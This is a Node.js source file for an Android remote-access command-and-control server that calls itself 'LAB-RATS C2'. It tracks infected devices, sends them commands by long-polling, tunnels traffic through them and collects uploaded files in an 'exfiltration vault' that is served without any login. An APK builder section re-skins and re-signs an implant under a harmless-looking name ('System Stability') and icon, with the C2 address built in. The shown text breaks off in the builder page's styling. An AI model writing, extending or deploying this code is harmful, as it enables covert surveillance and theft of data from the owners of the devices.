// Render Deploy Trigger v1.6.0-blob-engine
// [PATCH task-5] Real operator auth (random sessions), password policy,
// device credential (X-Device-Secret), XSS escaping, upload hardening.
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const zlib = require('zlib');
const { execFile, execFileSync } = require('child_process');

const app = express();
const PORT = process.env.PORT || 10000;

// ---- C2_PASSWORD: password login has been removed (panel is operator-open).
// Retained for logging / future re-enablement only; startup no longer fails.
const C2_PASSWORD = process.env.C2_PASSWORD || '';
if (!C2_PASSWORD || C2_PASSWORD === 'admin1337') {
    console.warn('[LAB-RATS C2] WARNING: C2_PASSWORD is not set or equals the default "admin1337". Password login is disabled; this value is unused until re-enabled.');
}

// ---- Device credential for /checkin /tunnel-poll /tunnel-response /upload ----
const DEVICE_SECRET = process.env.DEVICE_SECRET || '';
if (!DEVICE_SECRET) {
    console.warn('[LAB-RATS C2] WARNING: DEVICE_SECRET is not set. Device endpoints will reject every request with 401 until DEVICE_SECRET is configured and matches the secret injected into the APK (build-env -> BuildConfig via local.properties).');
}
function deviceSecretOk(req) {
    if (!DEVICE_SECRET) return false;
    const provided = req.headers['x-device-secret'] || '';
    if (typeof provided !== 'string' || provided.length !== DEVICE_SECRET.length) return false;
    try {
        return crypto.timingSafeEqual(Buffer.from(provided, 'utf8'), Buffer.from(DEVICE_SECRET, 'utf8'));
    } catch (e) { return false; }
}

// ---- Operator sessions: crypto.randomBytes(32) tokens, in-memory, 30 min TTL ----
const SESSION_TTL_MS = 30 * 60 * 1000;
const sessions = new Map(); // token -> expiresAt (epoch ms)
function createSession() {
    const token = crypto.randomBytes(32).toString('hex');
    sessions.set(token, Date.now() + SESSION_TTL_MS);
    return token;
}
function pruneSessions() {
    const now = Date.now();
    for (const [token, exp] of sessions) {
        if (exp <= now) sessions.delete(token);
    }
}
setInterval(pruneSessions, 60 * 1000).unref();

// ---- Login rate limiting: per-IP, 5 failures -> 10 min lockout ----
const LOGIN_LOCK_MS = 10 * 60 * 1000;
const LOGIN_MAX_FAILURES = 5;
const loginFailures = new Map(); // ip -> { count, lockedUntil }
function loginLocked(ip) {
    const rec = loginFailures.get(ip);
    if (!rec) return false;
    if (rec.lockedUntil && Date.now() < rec.lockedUntil) return true;
    if (rec.lockedUntil && Date.now() >= rec.lockedUntil) { loginFailures.delete(ip); return false; }
    return false;
}
function recordLoginFailure(ip) {
    const rec = loginFailures.get(ip) || { count: 0, lockedUntil: 0 };
    rec.count += 1;
    if (rec.count >= LOGIN_MAX_FAILURES) {
        rec.lockedUntil = Date.now() + LOGIN_LOCK_MS;
        rec.count = 0;
        console.warn(`[LAB-RATS C2] Login locked for 10 minutes from IP ${ip} after ${LOGIN_MAX_FAILURES} failures.`);
    }
    loginFailures.set(ip, rec);
}
function recordLoginSuccess(ip) { loginFailures.delete(ip); }

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/c2', express.static(path.join(__dirname, 'c2')));

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR, { recursive: true });
}
// NOTE: /c2/downloads is mounted later without a session guard
// (password login was removed, vault downloads are open by design).

const devices = new Map();
const commandQueues = new Map();
const pendingResponses = new Map();
const longPollWaiters = new Map(); // deviceId -> Array of res objects
const exfiltratedFiles = [];

const DATA_FILE = path.join(__dirname, 'devices.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            const json = JSON.parse(raw);
            if (json.devices && Array.isArray(json.devices)) {
                json.devices.forEach(d => {
                    if (d && (d.deviceId || d.model || d.brand)) {
                        const id = d.deviceId || d.brand || d.model;
                        devices.set(id, d);
                    }
                });
            }
            if (json.uploads && Array.isArray(json.uploads)) {
                exfiltratedFiles.push(...json.uploads);
            }
        }
    } catch (e) {}
}

function saveData() {
    try {
        const data = {
            devices: Array.from(devices.values()),
            uploads: exfiltratedFiles.slice(0, 200)
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (e) {}
}

loadData();

function syncUploadsDirectory() {
    try {
        if (!fs.existsSync(UPLOADS_DIR)) return;
        const filesOnDisk = fs.readdirSync(UPLOADS_DIR);
        filesOnDisk.forEach(filename => {
            if (filename.startsWith('.')) return;
            const exists = exfiltratedFiles.some(f => f.filename === filename);
            if (!exists) {
                const filePath = path.join(UPLOADS_DIR, filename);
                const stats = fs.statSync(filePath);

                let origName = filename;
                const match = filename.match(/^\d+_(.+)$/);
                if (match) origName = match[1];

                exfiltratedFiles.unshift({
                    id: Math.random().toString(36).substring(7),
                    filename: filename,
                    originalName: origName,
                    deviceId: 'Exfiltrated_Payload',
                    size: stats.size,
                    timestamp: stats.mtime.toISOString()
                });
            }
        });
    } catch (e) {}
}

syncUploadsDirectory();

function formatTime(isoString) {
    try {
        return new Date(isoString || Date.now()).toLocaleString('en-US', {
            timeZone: 'America/Toronto', hour12: true
        });
    } catch (e) {
        return new Date(isoString || Date.now()).toLocaleString();
    }
}

function formatFileSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

let lastActiveDeviceId = null;

function getCookie(cookieHeader, name) {
    if (!cookieHeader) return null;
    const matches = cookieHeader.match(new RegExp('(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)'));
    return matches ? decodeURIComponent(matches[1]) : null;
}

// HTML-escape for any device/operator-supplied string rendered into the panel
function escapeHtml(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
    }[c]));
}

// JS-string-literal-safe for values embedded in inline onclick attributes
function jsStr(s) {
    return String(s == null ? '' : s)
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        .replace(/</g, '\\u003c')
        .replace(/>/g, '\\u003e');
}

function isAuthenticated(req) {
    // Valid operator session: random token stored in the in-memory session table,
    // accepted via cookie (preferred) or ?token= (for /c2/downloads links).
    const token = getCookie(req.headers.cookie, 'c2_auth_token') ||
        ((req.query && req.query.token) ? String(req.query.token) : '');
    if (!token) return false;
    const exp = sessions.get(token);
    if (!exp) return false;
    if (Date.now() >= exp) { sessions.delete(token); return false; }
    return true;
}

// Exfiltration vault: served without a session (password login removed).
app.use('/c2/downloads', express.static(UPLOADS_DIR));

// Render health check endpoint (anonymous, always 200)
app.get('/healthz', (req, res) => res.status(200).send('ok'));

function dispatchCommand(deviceId, cmd) {
    let waiters = longPollWaiters.get(deviceId) || [];
    while (waiters.length > 0) {
        let res = waiters.shift();
        if (!res.headersSent) {
            res.json(cmd);
            return true;
        }
    }
    if (!commandQueues.has(deviceId)) commandQueues.set(deviceId, []);
    commandQueues.get(deviceId).push(cmd);
    return false;
}

// serveLoginPage removed — password login was deleted in the panel refactor.


// LOGIN ROUTES — password login removed (panel is operator-open by design).
// GET/POST /login redirect straight to the dashboard. The per-IP rate-limit
// and session helpers above are retained untouched for potential re-enablement.
app.get('/login', (req, res) => res.redirect('/'));
app.post('/login', (req, res) => res.redirect('/'));

// Ingestion Handler for device check-ins
function handleCheckin(req, res) {
    if (!deviceSecretOk(req)) {
        return res.status(401).json({ success: false, error: 'Device credential required (X-Device-Secret)' });
    }
    try {
        const contentType = req.headers['content-type'] || '';
        if (contentType.includes('multipart/form-data')) {
            return handleFileUpload(req, res);
        }

        const payload = req.body || {};
        const query = req.query || {};
        const data = { ...query, ...payload };

        const brand = data.brand || data.manufacturer || 'Android';
        const model = data.model || data.device || 'Device';
        const deviceId = data.deviceId || data.model || data.device || brand || 'Android Target';

        const existing = devices.get(deviceId);
        const alias = (existing && existing.alias) ? existing.alias : (data.alias || '');

        const entry = {
            deviceId,
            brand,
            model,
            alias,
            os: data.os || 'Android 16',
            battery: data.battery || '100%',
            ip: data.ip || req.ip || '127.0.0.1',
            port: data.port || 9191,
            stealth: !!data.stealth,
            lastSeen: new Date().toISOString(),
            ...data
        };

        devices.set(deviceId, entry);
        saveData();

        console.log(`[CHECKIN SUCCESS] DeviceId: ${deviceId} | Alias: "${alias}" | Brand: ${brand} | Model: ${model} | IP: ${entry.ip}`);
        res.json({ success: true, message: 'Check-in recorded' });
    } catch (err) {
        res.status(400).json({ success: false, error: err.message });
    }
}

// File Upload / Exfiltration Handler (device credential required, 50MB cap, extension whitelist)
const MAX_UPLOAD_BYTES = 50 * 1024 * 1024;
const ALLOWED_EXT = /\.(jpe?g|png|gif|webp|bmp|mp4|m4a|aac|3gp|amr|wav|mp3|txt|log|json|zip|pdf)$/i;

function handleFileUpload(req, res) {
    if (!deviceSecretOk(req)) {
        return res.status(401).json({ success: false, error: 'Device credential required (X-Device-Secret)' });
    }
    try {
        const contentType = req.headers['content-type'] || '';
        const deviceId = req.headers['x-device-id'] || req.query.deviceId || 'Unknown_Target';

        if (!contentType.includes('multipart/form-data')) {
            return res.status(400).json({ success: false, error: 'Expected multipart/form-data' });
        }

        const declaredLength = parseInt(req.headers['content-length'] || '0', 10);
        if (declaredLength > MAX_UPLOAD_BYTES) {
            return res.status(413).json({ success: false, error: 'Upload exceeds 50MB limit' });
        }

        const boundary = contentType.split('boundary=')[1];
        if (!boundary) {
            return res.status(400).json({ success: false, error: 'No boundary found' });
        }

        let bodyBuffer = [];
        let totalBytes = 0;
        let tooLarge = false;
        req.on('data', chunk => {
            totalBytes += chunk.length;
            if (totalBytes > MAX_UPLOAD_BYTES) {
                tooLarge = true;
                if (!res.headersSent) {
                    res.status(413).json({ success: false, error: 'Upload exceeds 50MB limit' });
                }
                req.destroy();
                return;
            }
            bodyBuffer.push(chunk);
        });
        req.on('end', () => {
            try {
                if (tooLarge) return;
                const buffer = Buffer.concat(bodyBuffer);
                const boundaryStr = '--' + boundary;
                const parts = buffer.toString('binary').split(boundaryStr);

                let savedFile = null;

                for (let part of parts) {
                    if (part.includes('filename="')) {
                        const filenameMatch = part.match(/filename="([^"]+)"/);
                        const filename = filenameMatch ? filenameMatch[1] : `exfil_${Date.now()}.dat`;

                        // Extension whitelist — reject unsupported file types
                        if (!ALLOWED_EXT.test(filename)) {
                            console.warn(`[EXFIL REJECTED] Extension not whitelisted: ${filename} (device ${deviceId})`);
                            return res.status(400).json({ success: false, error: 'File extension not allowed' });
                        }

                        const headerEnd = part.indexOf('\r\n\r\n');
                        if (headerEnd !== -1) {
                            let fileDataBinary = part.substring(headerEnd + 4);
                            if (fileDataBinary.endsWith('\r\n')) {
                                fileDataBinary = fileDataBinary.substring(0, fileDataBinary.length - 2);
                            }

                            const safeFilename = `${Date.now()}_${filename.replace(/[^a-zA-Z0-9_\.-]/g, '_')}`;
                            const filePath = path.join(UPLOADS_DIR, safeFilename);

                            fs.writeFileSync(filePath, Buffer.from(fileDataBinary, 'binary'));

                            const fileEntry = {
                                id: Math.random().toString(36).substring(7),
                                filename: safeFilename,
                                originalName: filename,
                                deviceId,
                                size: Buffer.byteLength(fileDataBinary, 'binary'),
                                timestamp: new Date().toISOString()
                            };

                            exfiltratedFiles.unshift(fileEntry);
                            saveData();
                            savedFile = fileEntry;

                            console.log(`[EXFIL SUCCESS] Saved ${filename} (${fileEntry.size} bytes) from device ${deviceId}`);
                        }
                    }
                }

                if (savedFile) {
                    res.json({ success: true, message: 'File ingested into Data Vault', file: savedFile });
                } else {
                    res.status(400).json({ success: false, error: 'No file found in multipart payload' });
                }
            } catch (err) {
                console.error('[EXFIL ERROR]', err.message);
                res.status(500).json({ success: false, error: err.message });
            }
        });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
}

// Unauthenticated Device Check-in & Exfiltration Routes
app.all('/checkin', handleCheckin);
app.all('/checkin/', handleCheckin);
app.all('/api/checkin', handleCheckin);
app.all('/api/checkin/', handleCheckin);
app.post('/checkin', handleCheckin);

app.all('/upload', handleFileUpload);
app.all('/upload/', handleFileUpload);
app.all('/api/upload', handleFileUpload);
app.all('/api/upload/', handleFileUpload);
app.post('/upload', handleFileUpload);

// Device command polling with Instant Long-Polling
function handleTunnelPoll(req, res) {
    if (!deviceSecretOk(req)) {
        return res.status(401).json({ success: false, error: 'Device credential required (X-Device-Secret)' });
    }
    const id = req.query.deviceId;
    if (!id) return res.json({});

    if (devices.has(id)) {
        const dev = devices.get(id);
        dev.lastSeen = new Date().toISOString();
    }

    const queue = commandQueues.get(id) || [];
    if (queue.length > 0) {
        return res.json(queue.shift());
    }

    let polls = longPollWaiters.get(id) || [];
    polls.push(res);
    longPollWaiters.set(id, polls);

    req.on('close', () => {
        let list = longPollWaiters.get(id) || [];
        longPollWaiters.set(id, list.filter(r => r !== res));
    });

    setTimeout(() => {
        let list = longPollWaiters.get(id) || [];
        if (list.includes(res)) {
            longPollWaiters.set(id, list.filter(r => r !== res));
            if (!res.headersSent) res.json({});
        }
    }, 10000);
}
app.get('/tunnel-poll', handleTunnelPoll);
app.get('/checkin/tunnel-poll', handleTunnelPoll);

// Device command response
function handleTunnelResponse(req, res) {
    if (!deviceSecretOk(req)) {
        return res.status(401).json({ success: false, error: 'Device credential required (X-Device-Secret)' });
    }
    const data = req.body || {};
    const pending = pendingResponses.get(data.id);
    if (pending) {
        pendingResponses.delete(data.id);
        const buf = Buffer.from(data.payload || '', 'base64');
        pending.res.status(data.status || 200);
        if (data.contentType) pending.res.setHeader('Content-Type', data.contentType);
        if (data.setCookie) pending.res.setHeader('Set-Cookie', data.setCookie);
        pending.res.send(buf);
    }
    res.json({ success: true });
}
app.post('/tunnel-response', handleTunnelResponse);
app.post('/checkin/tunnel-response', handleTunnelResponse);

// OPERATOR ROUTES ARE OPEN BY DESIGN — password login removed (panel refactor).
// Device routes above (/checkin /upload /tunnel-poll /tunnel-response) still
// enforce X-Device-Secret inside their own handlers (unchanged).

// Delete Exfiltrated File Endpoint
app.post('/api/delete-exfil', (req, res) => {
    try {
        const { id } = req.body || {};
        const idx = exfiltratedFiles.findIndex(f => f.id === id);
        if (idx !== -1) {
            const item = exfiltratedFiles[idx];
            const filePath = path.join(UPLOADS_DIR, item.filename);
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
            exfiltratedFiles.splice(idx, 1);
            saveData();
            console.log(`[EXFIL DELETED] Removed file ${item.filename}`);
            return res.json({ success: true });
        }
        res.status(404).json({ success: false, error: 'File not found' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Device Rename / Alias API Endpoint
app.post('/api/rename-device', (req, res) => {
    try {
        const { deviceId, alias } = req.body || {};
        if (deviceId && devices.has(deviceId)) {
            const dev = devices.get(deviceId);
            dev.alias = (alias || '').trim();
            devices.set(deviceId, dev);
            saveData();
            console.log(`[ALIAS UPDATED] Device ${deviceId} renamed to "${dev.alias}"`);
            return res.json({ success: true, alias: dev.alias });
        }
        res.status(400).json({ success: false, error: 'Device not found' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Device Delete Endpoint (operator session required)
app.post('/api/delete-device', (req, res) => {
    try {
        const { deviceId } = req.body || {};
        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
        if (devices.has(deviceId)) {
            devices.delete(deviceId);
            saveData();
            console.log(`[DEVICE DELETED] Removed device ${deviceId} from registry`);
            return res.json({ success: true });
        }
        res.status(404).json({ success: false, error: 'Device not found' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// =====================================================================
// ONLINE APK BUILDER — 构造中心（PATCH §10）
// 依赖 build-env 产出的 c2-server/builder/{template.apk, builder-keystore.p12,
// apksigner.jar}。占位符与 build-env 严格一致，等长替换；zip 条目按需
// 解压-替换-重打包（node zlib）；签名用本机 JRE/JDK（Render 上由
// render.yaml buildCommand 预下载 JRE 到 /tmp）。
// =====================================================================
const BUILDER_DIR = process.env.BUILDER_DIR || path.join(__dirname, 'builder');
const TEMPLATE_APK_PATH = path.join(BUILDER_DIR, 'template.apk');
const KEYSTORE_PATH = path.join(BUILDER_DIR, 'builder-keystore.p12');
const APKSIGNER_PATH = path.join(BUILDER_DIR, 'apksigner.jar');

const PKG_PLACEHOLDER = 'com.stability.sync';
const NAME_PLACEHOLDER = 'System Stability';
const C2_PLACEHOLDER = 'https://your-c2-host.example.com' + '#'.repeat(64); // 32 + 64 = 96 字符（与 build-env 模板一致）
const SECRET_PLACEHOLDER = '49ac647fd2dfe2549f5968df616de504';

function builderArtifactsReady() {
    return fs.existsSync(TEMPLATE_APK_PATH) && fs.existsSync(KEYSTORE_PATH) && fs.existsSync(APKSIGNER_PATH);
}
if (builderArtifactsReady()) {
    console.log('[LAB-RATS C2] Builder ready: template.apk + builder-keystore.p12 + apksigner.jar present under ' + BUILDER_DIR);
} else {
    console.warn('[LAB-RATS C2] WARNING: builder artifacts missing under ' + BUILDER_DIR + ' — /api/build returns 503 until build-env produces them.');
}

// ---- zip 工具（解析 / 重建，保持结构正确，关键条目 4 字节对齐） ----
const CRC_TABLE = (() => {
    const t = new Int32Array(256);
    for (let n = 0; n < 256; n++) {
        let c = n;
        for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
        t[n] = c;
    }
    return t;
})();
function crc32(buf) {
    let c = -1;
    for (let i = 0; i < buf.length; i++) c = (c >>> 8) ^ CRC_TABLE[(c ^ buf[i]) & 0xff];
    return (c ^ -1) >>> 0;
}

function readZipEntries(buf) {
    let eocdOff = -1;
    for (let i = buf.length - 22; i >= Math.max(0, buf.length - 22 - 65535); i--) {
        if (buf.readUInt32LE(i) === 0x06054b50) { eocdOff = i; break; }
    }
    if (eocdOff === -1) throw new Error('ZIP 结构异常：找不到 EOCD');
    const count = buf.readUInt16LE(eocdOff + 10);
    const cdOff = buf.readUInt32LE(eocdOff + 16);
    const entries = [];
    let p = cdOff;
    for (let i = 0; i < count; i++) {
        if (buf.readUInt32LE(p) !== 0x02014b50) throw new Error('ZIP 结构异常：central directory 损坏');
        const dosTime = buf.readUInt16LE(p + 12);
        const dosDate = buf.readUInt16LE(p + 14);
        const compSize = buf.readUInt32LE(p + 20);
        const nameLen = buf.readUInt16LE(p + 28);
        const extraLen = buf.readUInt16LE(p + 30);
        const commentLen = buf.readUInt16LE(p + 32);
        const externalAttrs = buf.readUInt32LE(p + 38);
        const localOff = buf.readUInt32LE(p + 42);
        const name = buf.slice(p + 46, p + 46 + nameLen).toString('utf8');
        const lhMethod = buf.readUInt16LE(localOff + 8);
        const lhNameLen = buf.readUInt16LE(localOff + 26);
        const lhExtraLen = buf.readUInt16LE(localOff + 28);
        const dataStart = localOff + 30 + lhNameLen + lhExtraLen;
        const raw = buf.slice(dataStart, dataStart + compSize);
        let data = raw;
        if (lhMethod === 8) {
            try { data = zlib.inflateRawSync(raw); } catch (e) { data = raw; }
        }
        entries.push({ name, method: lhMethod, dosTime, dosDate, externalAttrs, data });
        p += 46 + nameLen + extraLen + commentLen;
    }
    return entries;
}

function buildZip(entries) {
    const locals = [];
    const centrals = [];
    const offsets = [];
    let offset = 0;
    for (const e of entries) {
        const nameBuf = Buffer.from(e.name, 'utf8');
        let extra = Buffer.alloc(0);
        if (e.method === 0) {
            // 未压缩（STORED）条目须保持数据 4 字节对齐（zipalign -f 4 语义）；
            // 未压缩 .so 按 4096 页对齐（-p 语义，Android 11+ 要求）。
            const alignTo = e.name.endsWith('.so') ? 4096 : 4;
            const pad = (alignTo - ((offset + 30 + nameBuf.length) % alignTo)) % alignTo;
            if (pad > 0) extra = Buffer.alloc(pad);
        } else if (e.name === 'classes.dex' || e.name === 'resources.arsc') {
            const pad = (4 - ((offset + 30 + nameBuf.length) % 4)) % 4;
            if (pad > 0) extra = Buffer.alloc(pad);
        }
        let method = e.method;
        let data = e.data;
        if (method === 8) data = zlib.deflateRawSync(e.data, { level: 9 });
        const crc = crc32(e.data);
        const lh = Buffer.alloc(30);
        lh.writeUInt32LE(0x04034b50, 0);
        lh.writeUInt16LE(20, 4);
        lh.writeUInt16LE(0x0800, 6); // UTF-8 文件名标志
        lh.writeUInt16LE(method, 8);
        lh.writeUInt16LE(e.dosTime || 0, 10);
        lh.writeUInt16LE(e.dosDate || 0, 12);
        lh.writeUInt32LE(crc, 14);
        lh.writeUInt32LE(data.length, 18);
        lh.writeUInt32LE(e.data.length, 22);
        lh.writeUInt16LE(nameBuf.length, 26);
        lh.writeUInt16LE(extra.length, 28);
        offsets.push(offset);
        locals.push(lh, nameBuf, extra, data);
        offset += lh.length + nameBuf.length + extra.length + data.length;

        const ch = Buffer.alloc(46);
        ch.writeUInt32LE(0x02014b50, 0);
        ch.writeUInt16LE(20, 4);
        ch.writeUInt16LE(20, 6);
        ch.writeUInt16LE(0x0800, 8);
        ch.writeUInt16LE(method, 10);
        ch.writeUInt16LE(e.dosTime || 0, 12);
        ch.writeUInt16LE(e.dosDate || 0, 14);
        ch.writeUInt32LE(crc, 16);
        ch.writeUInt32LE(data.length, 20);
        ch.writeUInt32LE(e.data.length, 24);
        ch.writeUInt16LE(nameBuf.length, 28);
        ch.writeUInt16LE(extra.length, 30);
        ch.writeUInt16LE(0, 32);
        ch.writeUInt16LE(0, 34);
        ch.writeUInt16LE(0, 36);
        ch.writeUInt32LE(e.externalAttrs || 0, 38);
        ch.writeUInt32LE(offsets[offsets.length - 1], 42);
        centrals.push(ch, nameBuf, extra);
    }
    const centralBuf = Buffer.concat(centrals);
    const eocd = Buffer.alloc(22);
    eocd.writeUInt32LE(0x06054b50, 0);
    eocd.writeUInt16LE(0, 4);
    eocd.writeUInt16LE(0, 6);
    eocd.writeUInt16LE(entries.length, 8);
    eocd.writeUInt16LE(entries.length, 10);
    eocd.writeUInt32LE(centralBuf.length, 12);
    eocd.writeUInt32LE(offset, 16);
    eocd.writeUInt16LE(0, 20);
    return Buffer.concat([...locals, centralBuf, eocd]);
}

// ---- 占位符替换（ASCII 与 UTF-16LE 两种编码都覆盖） ----
function replaceAll(buf, fromBuf, toBuf) {
    let count = 0;
    let idx = buf.indexOf(fromBuf);
    while (idx !== -1) {
        toBuf.copy(buf, idx);
        count++;
        idx = buf.indexOf(fromBuf, idx + fromBuf.length);
    }
    return count;
}
function utf16Buf(str) {
    const b = Buffer.alloc(str.length * 2);
    for (let i = 0; i < str.length; i++) b.writeUInt16LE(str.charCodeAt(i), i * 2);
    return b;
}
function replacePlaceholder(entryData, ph, value) {
    const fromA = Buffer.from(ph, 'utf8');
    const toA = Buffer.from(value, 'utf8');
    if (toA.length !== fromA.length) throw new Error('等长替换失败：' + ph);
    let count = replaceAll(entryData, fromA, toA);
    count += replaceAll(entryData, utf16Buf(ph), utf16Buf(value));
    return count;
}

function patchApk(templateBuf, pkg, name, c2, secret, iconBuf) {
    const entries = readZipEntries(templateBuf);
    let pkgN = 0, nameN = 0, c2N = 0, secN = 0;
    let iconSwapped = false;
    const kept = [];
    for (const e of entries) {
        if (/^META-INF\//.test(e.name)) continue; // 丢弃旧签名文件，重签时由 apksigner 重写
        let modified = false;
        const c1 = replacePlaceholder(e.data, PKG_PLACEHOLDER, pkg);
        if (c1) { pkgN += c1; modified = true; }
        const c2n = replacePlaceholder(e.data, NAME_PLACEHOLDER, name);
        if (c2n) { nameN += c2n; modified = true; }
        const c3 = replacePlaceholder(e.data, C2_PLACEHOLDER, c2);
        if (c3) { c2N += c3; modified = true; }
        const c4 = replacePlaceholder(e.data, SECRET_PLACEHOLDER, secret);
        if (c4) { secN += c4; modified = true; }
        kept.push(e);
    }
    // 图标替换：BUILDER_ICON_ENTRY（精确名）→ 规范 mipmap 路径 → 宽松匹配
    if (iconBuf) {
        const ICON_EXACT = process.env.BUILDER_ICON_ENTRY || '';
        const ICON_RE = /^res\/mipmap-[^/]+\/ic_launcher\.(webp|png)$/i;
        const ICON_RE2 = /(^|\/)(ic_launcher|app_icon|ic_logo)[^/]*\.(webp|png)$/i;
        let iconTarget = null;
        if (ICON_EXACT) {
            iconTarget = kept.find(e => e.name === ICON_EXACT) || null;
        }
        if (!iconTarget) iconTarget = kept.find(e => ICON_RE.test(e.name)) || null;
        if (!iconTarget) iconTarget = kept.find(e => ICON_RE2.test(e.name)) || null;
        if (!iconTarget) {
            throw new Error('模板中未找到可替换的启动图标条目（资源路径已混淆或名称不符）。可设置 BUILDER_ICON_ENTRY 指定精确条目名，或不上传图标');
        }
        iconTarget.data = iconBuf;
        if (iconTarget.method !== 8) iconTarget.method = 8;
        iconSwapped = true;
    }
    if (!pkgN) throw new Error('包名占位在模板中未找到（模板与占位规范不一致，请联系构建端）');
    if (!nameN) throw new Error('应用名占位在模板中未找到');
    if (!c2N) throw new Error('C2 地址占位在模板中未找到');
    if (!secN) throw new Error('设备密钥占位在模板中未找到');
    return { out: buildZip(kept), counts: { pkgN, nameN, c2N, secN, iconSwapped } };
}

// ---- Java 探测（签名用）：JAVA_HOME → Render /tmp/jdk-* → 常见安装目录 → PATH ----
function findJava() {
    const exe = process.platform === 'win32' ? 'java.exe' : 'java';
    const cands = [];
    if (process.env.JAVA_HOME) cands.push(path.join(process.env.JAVA_HOME, 'bin', exe));
    if (process.platform !== 'win32') {
        try {
            for (const d of fs.readdirSync('/tmp')) {
                if (d.startsWith('jdk-')) cands.push(path.join('/tmp', d, 'bin', exe));
            }
        } catch (e) {}
    } else {
        const dirs = ['C:\\Program Files\\Microsoft', 'C:\\Program Files\\Java', 'C:\\Program Files\\Eclipse Adoptium'];
        for (const base of dirs) {
            try {
                for (const d of fs.readdirSync(base)) {
                    if (d.startsWith('jdk-') || d.startsWith('jre-')) cands.push(path.join(base, d, 'bin', exe));
                }
            } catch (e) {}
        }
    }
    for (const c of cands) {
        if (fs.existsSync(c)) return c;
    }
    // PATH 探测
    try {
        execFileSync(exe, ['-version'], { stdio: 'ignore' });
        return exe;
    } catch (e) {}
    return null;
}
function execFileAsync(file, args) {
    return new Promise((resolve, reject) => {
        execFile(file, args, { maxBuffer: 16 * 1024 * 1024 }, (err, stdout, stderr) => {
            if (err) reject(new Error(String(stderr || err.message).slice(0, 600)));
            else resolve(stdout);
        });
    });
}
function readRawBody(req, maxBytes) {
    return new Promise((resolve, reject) => {
        const chunks = [];
        let total = 0;
        let settled = false;
        req.on('data', c => {
            if (settled) return;
            total += c.length;
            if (total > maxBytes) {
                settled = true;
                reject(new Error('请求体超过 ' + Math.round(maxBytes / 1024 / 1024) + 'MB 上限'));
                req.destroy();
                return;
            }
            chunks.push(c);
        });
        req.on('end', () => { if (!settled) { settled = true; resolve(Buffer.concat(chunks)); } });
        req.on('error', e => { if (!settled) { settled = true; reject(e); } });
    });
}
function parseMultipartFields(buffer, boundary) {
    const b = Buffer.from('--' + boundary, 'latin1');
    const out = { fields: {}, files: {} };
    let idx = buffer.indexOf(b);
    while (idx !== -1) {
        const end = buffer.indexOf(b, idx + b.length);
        const part = (end === -1) ? buffer.slice(idx + b.length) : buffer.slice(idx + b.length, end);
        const headerEnd = part.indexOf('\r\n\r\n');
        if (headerEnd !== -1) {
            const headerStr = part.slice(0, headerEnd).toString('utf8');
            let body = part.slice(headerEnd + 4);
            if (body.length >= 2 && body[body.length - 2] === 13 && body[body.length - 1] === 10) {
                body = body.slice(0, body.length - 2);
            }
            const nameMatch = headerStr.match(/name="([^"]*)"/);
            const fileMatch = headerStr.match(/filename="([^"]*)"/);
            if (nameMatch) {
                if (fileMatch) out.files[nameMatch[1]] = body;
                else out.fields[nameMatch[1]] = body.toString('utf8');
            }
        }
        if (end === -1) break;
        idx = end;
    }
    return out;
}

// ---- 构造页面 GET /builder ----
function serveBuilderPage() {
    return `<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>构造中心</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root{--adm-bg:#0a0a0a;--adm-card:#111113;--adm-border:#26262b;--adm-text:#fafafa;--adm-muted:#a1a1aa}
        *{box-sizing:border-box;margin:0;padding:0}
        html,body{height:100%}
        body{background:var(--adm-bg);color:var(--adm-text);font-family:'Inter','Noto Sans SC',-apple-system,'Segoe UI','Microsoft YaHei',sans-serif;font-size:14px;-webkit-font-smoothing:antialiased}
        .adm-layout{display:flex;min-height:100vh}
        .adm-sidebar{width:220px;flex:0 0 220px;background:var(--adm-card);border-right:1px solid var(--adm-border);display:flex;flex-direction:column;position:fixed;top:0;bottom:0;left:0;z-index:10}
        .adm-sidebar-title{padding:20px 20px 16px;font-size:15px;font-weight:700;border-bottom:1px solid var(--adm-border)}
        .adm-nav{flex:1;padding:12px 10px}
        .adm-nav a{display:block;padding:10px 12px;border-radius:8px;color:var(--adm-muted);text-decoration:none;font-size:13.5px;font-weight:500;transition:opacity .12s}
        .adm-nav a:hover{opacity:.8}
        .adm-nav a.adm-active{background:#1a1a1e;color:var(--adm-text)}
        .adm-sidebar-foot{padding:14px 20px;border-top:1px solid var(--adm-border);font-size:11.5px;color:var(--adm-muted);white-space:nowrap}
        .adm-main{flex:1;margin-left:220px;display:flex;flex-direction:column;min-width:0}
